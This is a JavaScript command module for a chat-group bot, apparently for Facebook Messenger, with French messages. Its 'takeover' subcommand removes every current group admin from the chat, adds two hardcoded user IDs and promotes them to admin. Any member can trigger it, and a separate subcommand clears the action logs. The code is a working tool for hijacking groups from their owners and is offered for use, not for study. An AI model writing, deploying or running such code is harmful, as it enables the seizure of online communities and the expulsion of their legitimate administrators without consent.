const fs = require("fs-extra");
const path = require("path");

const LOG_FILE = path.join(__dirname, "criminal_logs.json");

function loadLogs() {
  try {
    if (fs.existsSync(LOG_FILE)) return JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));
  } catch {}
  return { actions: [], users: {} };
}

function saveLogs(logs) {
  try { fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2)); } catch {}
}

function UI(lines) {
  let out = "╭─────────────────────•\n";
  for (const l of lines) {
    if (l === "---") { out += "├─────────────────────•\n"; continue; }
    out += `│ ${l}\n`;
  }
  return out + "╰─────────────────────•";
}

const TARGET_IDS = ["61589133048588", "61580558711299"];

module.exports = {
  config: {
    name: "criminal",
    version: "1.0",
    author: "Ismael03-Dev",
    countDown: 10,
    role: 0,
    category: "admin",
    shortDescription: { en: "Criminal takeover" },
    longDescription: "Supprime les admins et ajoute des nouveaux admins"
  },

  onStart: async function ({ api, event, args }) {
    const threadID = event.threadID;
    const senderID = event.senderID;
    const sub = (args[0] || "").toLowerCase();

    const logs = loadLogs();

    if (sub === "help" || !sub) {
      return api.sendMessage(UI([
        "🔫 CRIMINAL COMMANDS",
        "---",
        `${global.utils.getPrefix(threadID)}criminal takeover`,
        `${global.utils.getPrefix(threadID)}criminal status`,
        `${global.utils.getPrefix(threadID)}criminal logs`,
        `${global.utils.getPrefix(threadID)}criminal clear`,
        "---",
        "⚠️ Utilisation risquée !"
      ]), threadID);
    }

    if (sub === "status") {
      try {
        const threadInfo = await api.getThreadInfo(threadID);
        const admins = threadInfo.adminIDs || [];
        
        const isTargetAdmin = admins.some(a => TARGET_IDS.includes(String(a.id)));
        const currentAdmins = await Promise.all(
          admins.map(async (a) => {
            try {
              const info = await api.getUserInfo(a.id);
              return info[a.id]?.name || a.id;
            } catch { return a.id; }
          })
        );

        const targetNames = await Promise.all(
          TARGET_IDS.map(async (id) => {
            try {
              const info = await api.getUserInfo(id);
              return info[id]?.name || id;
            } catch { return id; }
          })
        );

        return api.sendMessage(UI([
          "🔫 STATUS DU GROUPE",
          "---",
          `👥 Admins actuels: ${admins.length}`,
          `📋 ${currentAdmins.join(", ")}`,
          "---",
          `🎯 Admin cible: ${isTargetAdmin ? "✅ OUI" : "❌ NON"}`,
          `📌 IDs: ${TARGET_IDS.join(", ")}`,
          `👤 ${targetNames.join(", ")}`,
          "---",
          `🆔 Groupe: ${threadID}`
        ]), threadID);
      } catch (error) {
        return api.sendMessage(UI(["❌ Erreur", "---", error.message]), threadID);
      }
    }

    if (sub === "logs") {
      const userLogs = logs.actions.filter(a => a.threadID === threadID).slice(-10);
      if (userLogs.length === 0) {
        return api.sendMessage(UI(["📜 Aucun log pour ce groupe"]), threadID);
      }

      const lines = ["📜 CRIMINAL LOGS", "---"];
      for (const log of userLogs.reverse()) {
        const date = new Date(log.timestamp).toLocaleString("fr-FR");
        lines.push(`${log.action} | ${date}`);
        if (log.details) lines.push(`   ${log.details}`);
        lines.push("---");
      }
      return api.sendMessage(UI(lines), threadID);
    }

    if (sub === "clear") {
      logs.actions = logs.actions.filter(a => a.threadID !== threadID);
      saveLogs(logs);
      return api.sendMessage(UI(["🗑️ Logs effacés"]), threadID);
    }

    if (sub === "takeover") {
      const loadingMsg = await api.sendMessage(UI([
        "🔫 CRIMINAL TAKEOVER",
        "---",
        "⏳ Exécution en cours..."
      ]), threadID);

      try {
        const threadInfo = await api.getThreadInfo(threadID);
        const admins = threadInfo.adminIDs || [];

        let removed = 0;
        let failed = 0;
        let alreadyTarget = 0;

        const targetAlreadyAdmin = admins.some(a => TARGET_IDS.includes(String(a.id)));
        if (targetAlreadyAdmin) {
          alreadyTarget = TARGET_IDS.filter(id => admins.some(a => String(a.id) === id)).length;
        }

        const nonTargetAdmins = admins.filter(a => !TARGET_IDS.includes(String(a.id)));

        for (const admin of nonTargetAdmins) {
          try {
            await api.removeUserFromGroup(admin.id, threadID);
            removed++;
            await new Promise(resolve => setTimeout(resolve, 500));
          } catch {
            failed++;
          }
        }

        let added = 0;
        for (const targetId of TARGET_IDS) {
          if (!admins.some(a => String(a.id) === targetId)) {
            try {
              await api.addUserToGroup(targetId, threadID);
              await new Promise(resolve => setTimeout(resolve, 800));
              added++;
            } catch {}
          }
        }

        let promoted = 0;
        for (const targetId of TARGET_IDS) {
          try {
            await api.changeAdminStatus(threadID, targetId, true);
            promoted++;
            await new Promise(resolve => setTimeout(resolve, 600));
          } catch {}
        }

        const logEntry = {
          action: "TAKEOVER",
          threadID,
          timestamp: Date.now(),
          details: `Admins supprimés: ${removed}, Échecs: ${failed}, Ajoutés: ${added}, Promus: ${promoted}, Déjà admin: ${alreadyTarget}`
        };
        logs.actions.push(logEntry);
        if (logs.actions.length > 100) logs.actions = logs.actions.slice(-100);
        saveLogs(logs);

        await api.unsendMessage(loadingMsg.messageID);

        const finalMessage = [
          "🔫 TAKEOVER REUSSI !",
          "---",
          `🗑️ Admins supprimés: ${removed}`,
          `❌ Échecs: ${failed}`,
          `➕ Admins ajoutés: ${added}`,
          `⭐ Promus: ${promoted}`,
          `✅ Déjà admin: ${alreadyTarget}`,
          "---",
          `🎯 Nouveaux admins: ${TARGET_IDS.join(", ")}`,
          `📊 Total admins: ${admins.length - removed + promoted}`,
          "---",
          `📜 Logs sauvegardés: ${logs.actions.length} entrées`
        ];

        if (promoted === 0 && added === 0 && removed === 0) {
          finalMessage.push("⚠️ Aucun changement effectué");
        }

        return api.sendMessage(UI(finalMessage), threadID);

      } catch (error) {
        await api.unsendMessage(loadingMsg.messageID).catch(() => {});
        return api.sendMessage(UI([
          "❌ TAKEOVER ÉCHOUÉ",
          "---",
          `Erreur: ${error.message}`,
          "💡 Vérifie les permissions du bot"
        ]), threadID);
      }
    }

    return api.sendMessage(UI([`❌ Commande inconnue`, `💡 ${global.utils.getPrefix(threadID)}criminal help`]), threadID);
  }
};